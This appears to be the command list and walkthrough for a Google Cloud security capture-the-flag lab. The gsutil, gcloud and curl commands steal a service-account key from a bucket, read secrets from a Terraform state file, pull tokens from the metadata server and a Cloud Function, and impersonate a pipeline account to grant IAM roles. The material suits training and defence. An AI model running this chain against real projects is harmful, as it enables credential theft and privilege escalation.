# Commands

<details>
  <summary>***** Module 1 *****</summary>

## Module 1

list dev bucket contents
#####
    gsutil ls gs://modeldata-dev-$PROJECT_ID/

download service account key
#####
    gsutil cp gs://modeldata-dev-$PROJECT_ID/bucket-service-account.json .

activate service account
#####
    gcloud auth activate-service-account --key-file=bucket-service-account.json

discover prod bucket
#####
    gsutil ls gs://modeldata-prod-$PROJECT_ID/

find flag
#####
    gsutil cat gs://modeldata-prod-$PROJECT_ID/secret_benchmarks/flag1_gpt5_benchmarks.txt

  <details>
    <summary>Walkthrough Module 1</summary>
    
  1. List contents of the dev bucket provided
  2. Notice the service account JSON file
  3. Download and activate the service account
  4. Test predictable bucket naming (dev → prod)
  5. Access prod bucket and find the flag

  </details>

</details>

#

<details>
  <summary>***** Module 2 *****</summary>

## Module 2

read state file
#####
    gsutil cat gs://file-uploads-$PROJECT_ID/infrastructure_config.tfstate

  <details>
    <summary>Walkthrough Module 2</summary>
    
  ssh into vm
  #####
    ssh -i <private key file> alice@<compute instance IP> 

  </details>

</details>

#

<details>
  <summary>***** Module 3 *****</summary>

## Module 3

show VM service account
#####
    gcloud auth list

background: metadata server
#####
    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"

demonstrate limited access scopes
#####
    gcloud compute instances list

show access scopes from tokeninfo endpoint
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)

list storage buckets from VM
#####
    gsutil ls

  <details>
    <summary>Walkthrough Module 3</summary>

  list function source code bucket
  #####
      gsutil ls gs://cloud-function-bucket-module3

  read source code
  #####
      gsutil cat gs://cloud-function-bucket-module3/main.py

  execute function invocation script
  #####
      ./invoke_monitoring_function.sh

  extract command to get function token
  #####
    # Get the Gen2 function URL (Cloud Run service)
    FUNCTION_URL=$(gcloud run services describe monitoring-function --region=$LOCATION --format='value(status.url)')
    # Or use the hard-coded URL from invoke_monitoring_function.sh
    curl -s -X POST $FUNCTION_URL -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'

  save the new token in env var and check access scopes
  #####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$TOKEN
    
  </details>

</details>

#

<details>
  <summary>***** Challenge 5 *****</summary>

## Challenge 5

set token as env var
#####
     export CLOUDSDK_AUTH_ACCESS_TOKEN=<function token>

Get project permissions
#####
    gcloud projects get-iam-policy $PROJECT_ID

List the other service accounts on this project:
#####
    gcloud iam service-accounts list

Describe role
#####
    gcloud iam roles describe TerraformPipelineProjectAdmin --project $PROJECT_ID

Describe bindings on SA
#####
    gcloud iam service-accounts get-iam-policy <terraform service account>

  <details>
    <summary>Walkthrough Challenge 5</summary>
  
  impersonate and set binding
  #####
    gcloud projects add-iam-policy-binding $PROJECT_ID --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>
  
  </details>

</details>
